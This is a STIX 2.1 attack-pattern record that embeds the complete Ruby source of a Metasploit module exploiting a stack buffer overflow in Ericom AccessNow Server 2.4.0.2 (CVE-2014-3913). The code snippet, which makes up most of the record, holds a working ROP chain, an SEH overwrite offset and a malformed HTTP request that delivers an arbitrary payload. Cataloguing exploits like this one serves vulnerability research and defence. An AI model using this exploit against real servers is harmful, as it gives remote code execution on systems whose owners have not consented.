{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--566d88b3-07ae-4ede-a0b2-1bf0e3dc813b",
    "created": "2024-08-14T16:53:49.84461Z",
    "modified": "2024-08-14T16:53:49.844614Z",
    "name": "Ericom AccessNow Server Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in Ericom AccessNow Server. The vulnerability is due to an insecure usage of vsprintf with user controlled data which can be triggered with a malformed HTTP request. This module has been tested successfully with Ericom AccessNow Server 2.4.0.2 on Windows XP SP3 and Windows 2003 Server SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ericom_access_now_bof.rb",
            "external_id": "ericom_access_now_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3913"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ericom AccessNow Server Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow in Ericom AccessNow Server. The\n        vulnerability is due to an insecure usage of vsprintf with user controlled data,\n        which can be triggered with a malformed HTTP request. This module has been tested\n        successfully with Ericom AccessNow Server 2.4.0.2 on Windows XP SP3 and Windows 2003\n        Server SP2.\n      },\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability Discovery\n          'juan vazquez', # Metasploit Module\n        ],\n      'References'     =>\n        [\n          ['ZDI', '14-160'],\n          ['CVE', '2014-3913'],\n          ['BID', '67777'],\n          ['URL','http://www.ericom.com/security-ERM-2014-610.asp']\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Payload'        =>\n        {\n          'Space'    => 4096,\n          'BadChars' => \"\\x00\\x0d\\x0a\",\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Targets'        =>\n        [\n          [ 'Ericom AccessNow Server 2.4.0.2 / Windows [XP SP3 / 2003 SP2]',\n            {\n              'RopOffset' => 62,\n              'Offset' => 30668,\n              'Ret' => 0x104da1e5 # 0x104da1e5 {pivot 1200 / 0x4b0} # ADD ESP,4B0 # RETN # From AccessNowAccelerator32.dll\n            }\n          ]\n        ],\n      'DisclosureDate' => '2014-06-02',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(8080)])\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'uri' => '/AccessNow/start.html'\n    })\n\n    unless res && res.code == 200 && res.headers['Server']\n      return Exploit::CheckCode::Safe\n    end\n\n    if res.headers['Server'] =~ /Ericom AccessNow Server/\n      return Exploit::CheckCode::Appears # Ericom AccessNow 2.4\n    elsif res && res.code == 200 && res.headers['Server'] && res.headers['Server'] =~ /Ericom Access Server/\n      return Exploit::CheckCode::Detected # Ericom AccessNow 3\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit_uri\n    uri = \"#{rand_text_alpha(1)} \" # To ensure a \"malformed request\" error message\n    uri << rand_text(target['RopOffset'])\n    uri << create_rop_chain\n    uri << payload.encoded\n    uri << rand_text(target['Offset'] - uri.length)\n    uri << rand_text(4) # nseh\n    uri << [target.ret].pack(\"V\") # seh\n\n    uri\n  end\n\n  def exploit\n    print_status(\"Sending malformed request...\")\n    send_request_raw({\n      'method'  => 'GET',\n      'uri'     => exploit_uri,\n      'encode'  => false\n    }, 1)\n  end\n\n  def create_rop_chain\n    # rop chain generated with mona.py - www.corelan.be\n    rop_gadgets =\n      [\n        0x10518867, # RETN # [AccessNowAccelerator32.dll] # Padding to ensure it works in both windows 2003 SP2 and XP SP3\n        0x10518867, # RETN # [AccessNowAccelerator32.dll] # Padding to ensure it works in both windows 2003 SP2 and XP SP3\n        0x10518866, # POP EAX # RETN [AccessNowAccelerator32.dll]\n        0x105c6294, # ptr to &VirtualAlloc() [IAT AccessNowAccelerator32.dll]\n        0x101f292b, # MOV EAX,DWORD PTR DS:[EAX] # RETN [AccessNowAccelerator32.dll]\n        0x101017e6, # XCHG EAX,ESI # RETN [AccessNowAccelerator32.dll]\n        0x103ba89c, # POP EBP # RETN [AccessNowAccelerator32.dll]\n        0x103eed74, # & jmp esp [AccessNowAccelerator32.dll]\n        0x1055dac2, # POP EAX # RETN [AccessNowAccelerator32.dll]\n        0xffffffff, # Value to negate, will become 0x00000001\n        0x1052f511, # NEG EAX # RETN [AccessNowAccelerator32.dll]\n        0x10065f69, # XCHG EAX,EBX # RETN [AccessNowAccelerator32.dll]\n        0x10074429, # POP EAX # RETN [AccessNowAccelerator32.dll]\n        0xfbdbcb75, # put delta into eax (-> put 0x00001000 into edx)\n        0x10541810, # ADD EAX,424448B # RETN [AccessNowAccelerator32.dll]\n        0x1038e58a, # XCHG EAX,EDX # RETN [AccessNowAccelerator32.dll]\n        0x1055d604, # POP EAX # RETN [AccessNowAccelerator32.dll]\n        0xffffffc0, # Value to negate, will become 0x00000040\n        0x10528db3, # NEG EAX # RETN [AccessNowAccelerator32.dll]\n        0x1057555d, # XCHG EAX,ECX # RETN [AccessNowAccelerator32.dll]\n        0x1045fd24, # POP EDI # RETN [AccessNowAccelerator32.dll]\n        0x10374022, # RETN (ROP NOP) [AccessNowAccelerator32.dll]\n        0x101f25d4, # POP EAX # RETN [AccessNowAccelerator32.dll]\n        0x90909090, # nop\n        0x1052cfce  # PUSHAD # RETN [AccessNowAccelerator32.dll]\n      ].pack(\"V*\")\n\n    rop_gadgets\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-02",
    "x_mitre_platforms": [
        "win'"
    ]
}